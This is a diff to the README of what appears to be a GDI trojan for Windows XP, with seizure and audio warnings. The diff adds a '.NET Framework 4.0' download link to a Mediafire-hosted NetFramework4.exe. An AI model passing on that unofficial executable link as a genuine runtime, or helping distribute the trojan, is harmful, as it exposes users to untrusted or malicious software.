@@ -4,7 +4,7 @@
 ### Version: 1.0
 ### Category: TrojanGdi.Win32
 ### Compatible Platforms: WinXP
-### Execution Requirement: .NET Framework 4.0
+### Execution Requirement: .NET Framework 4.0 [LINK DOWNLOAD:  https://www.mediafire.com/file/4jhlkaaeashxy1g/NetFramework4.exe/file]
 ## 🚫 PHOTOSENSITIVE SEIZURE WARNING 🚫
 ### Specific Graphic Effects? YES
 ### Loud or Intense Audio? YES
